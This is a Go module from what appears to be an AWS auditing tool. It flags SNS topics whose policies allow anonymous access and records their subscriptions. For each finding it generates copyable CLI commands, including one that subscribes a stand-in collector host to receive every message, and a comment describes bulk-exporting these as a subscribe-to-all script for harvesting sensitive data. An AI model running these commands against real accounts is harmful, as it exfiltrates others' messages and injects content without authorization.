package public_sns

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/sns"

	"github.com/bc0la/BezosBuster/internal/awsapi"
	"github.com/bc0la/BezosBuster/internal/creds"
	"github.com/bc0la/BezosBuster/internal/findings"
	"github.com/bc0la/BezosBuster/internal/module"
)

type Module struct{}

func init() { module.Register(Module{}) }

func (Module) Name() string      { return "public_sns" }
func (Module) Kind() module.Kind { return module.KindNative }
func (Module) Requires() []string {
	return []string{"sns:ListTopics", "sns:GetTopicAttributes", "sns:ListSubscriptionsByTopic"}
}

type policyDoc struct {
	Statement []policyStmt `json:"Statement"`
}

type policyStmt struct {
	Effect    string          `json:"Effect"`
	Principal json.RawMessage `json:"Principal"`
	Action    json.RawMessage `json:"Action"`
	Condition json.RawMessage `json:"Condition"`
}

func isAnonymousPrincipal(raw json.RawMessage) bool {
	s := strings.TrimSpace(string(raw))
	if s == `"*"` {
		return true
	}
	var m map[string]json.RawMessage
	if err := json.Unmarshal(raw, &m); err == nil {
		for _, v := range m {
			vs := strings.TrimSpace(string(v))
			if vs == `"*"` || vs == `["*"]` {
				return true
			}
		}
	}
	return false
}

func hasCondition(raw json.RawMessage) bool {
	if len(raw) == 0 {
		return false
	}
	s := strings.TrimSpace(string(raw))
	return s != "" && s != "{}" && s != "null"
}

// grants reports whether an action list permits the given verb ("subscribe",
// "publish"), honouring the sns:* / * wildcards.
func grants(actions []string, verb string) bool {
	for _, a := range actions {
		la := strings.ToLower(strings.TrimSpace(a))
		if la == "*" || la == "sns:*" {
			return true
		}
		if strings.Contains(la, verb) {
			return true
		}
	}
	return false
}

func asList(raw json.RawMessage) []string {
	var s string
	if err := json.Unmarshal(raw, &s); err == nil {
		return []string{s}
	}
	var ss []string
	if err := json.Unmarshal(raw, &ss); err == nil {
		return ss
	}
	return nil
}

func (Module) Run(ctx context.Context, t creds.AccountTarget, sink findings.Sink) error {
	regions := awsapi.EnabledRegions(ctx, t.Config)
	for _, region := range regions {
		if err := scanRegion(ctx, t, region, sink); err != nil {
			_ = sink.LogEvent(ctx, "public_sns", t.AccountID, "warn", region+": "+err.Error())
		}
	}
	return nil
}

func scanRegion(ctx context.Context, t creds.AccountTarget, region string, sink findings.Sink) error {
	cli := sns.NewFromConfig(t.Config, func(o *sns.Options) { o.Region = region })

	var nextToken *string
	for {
		list, err := cli.ListTopics(ctx, &sns.ListTopicsInput{NextToken: nextToken})
		if err != nil {
			return fmt.Errorf("list topics: %w", err)
		}
		for _, topic := range list.Topics {
			topicARN := aws.ToString(topic.TopicArn)

			attrs, err := cli.GetTopicAttributes(ctx, &sns.GetTopicAttributesInput{
				TopicArn: aws.String(topicARN),
			})
			if err != nil {
				continue
			}
			policyStr := attrs.Attributes["Policy"]
			if policyStr == "" {
				continue
			}

			var doc policyDoc
			if err := json.Unmarshal([]byte(policyStr), &doc); err != nil {
				continue
			}

			for _, st := range doc.Statement {
				if !strings.EqualFold(st.Effect, "Allow") {
					continue
				}
				if !isAnonymousPrincipal(st.Principal) {
					continue
				}

				actions := asList(st.Action)
				cond := hasCondition(st.Condition)

				sev := findings.SevHigh
				if cond {
					sev = findings.SevMedium
				}

				// Extract topic name from ARN.
				topicName := topicARN
				if idx := strings.LastIndex(topicARN, ":"); idx >= 0 {
					topicName = topicARN[idx+1:]
				}

				// List existing subscriptions (shared context for every finding).
				var subs []map[string]string
				subList, err := cli.ListSubscriptionsByTopic(ctx, &sns.ListSubscriptionsByTopicInput{
					TopicArn: aws.String(topicARN),
				})
				if err == nil {
					for _, sub := range subList.Subscriptions {
						subs = append(subs, map[string]string{
							"protocol":     aws.ToString(sub.Protocol),
							"endpoint":     aws.ToString(sub.Endpoint),
							"subscription": aws.ToString(sub.SubscriptionArn),
						})
					}
				}

				// Emit one finding per anonymous capability so Subscribe and
				// Publish can be filtered (and exported) separately in the report.
				// The `check` field drives the UI's per-check facet; `curl` holds
				// copyable commands the "Export curls" button bulk-dumps — filter
				// to public_subscribe, export, and you have a subscribe-to-all
				// script for monitoring topics for sensitive data.
				emit := func(check, title string, curls []string) {
					t2 := title
					if cond {
						t2 += " (conditional)"
					}
					_ = sink.Write(ctx, findings.Finding{
						AccountID:   t.AccountID,
						Region:      region,
						Module:      "public_sns",
						Severity:    sev,
						ResourceARN: topicARN,
						Title:       t2,
						Detail: map[string]any{
							"check":         check,
							"topic_name":    topicName,
							"topic_arn":     topicARN,
							"actions":       actions,
							"has_condition": cond,
							"subscriptions": subs,
							"statement":     st,
							"curl":          curls,
						},
					})
				}

				emitted := false
				if grants(actions, "subscribe") {
					emitted = true
					emit("public_subscribe",
						fmt.Sprintf("SNS topic %s: anonymous Subscribe — anyone can subscribe an endpoint and receive every message", topicName),
						[]string{
							fmt.Sprintf("aws sns subscribe --region %s --topic-arn '%s' --protocol https --notification-endpoint 'https://YOUR-COLLECTOR.example/%s' --return-subscription-arn", region, topicARN, topicName),
							fmt.Sprintf("aws sns subscribe --region %s --topic-arn '%s' --protocol email --notification-endpoint 'you@example.com'", region, topicARN),
						})
				}
				if grants(actions, "publish") {
					emitted = true
					emit("public_publish",
						fmt.Sprintf("SNS topic %s: anonymous Publish — anyone can inject messages", topicName),
						[]string{
							fmt.Sprintf("aws sns publish --region %s --topic-arn '%s' --message 'bezosbuster-test'", region, topicARN),
						})
				}
				if !emitted {
					// Some other anonymous action (management / GetTopicAttributes).
					emit("public_other",
						fmt.Sprintf("SNS topic %s: anonymous access (%s)", topicName, strings.Join(actions, ", ")),
						[]string{
							fmt.Sprintf("aws sns get-topic-attributes --region %s --topic-arn '%s'", region, topicARN),
						})
				}
			}
		}
		if list.NextToken == nil {
			break
		}
		nextToken = list.NextToken
	}
	return nil
}
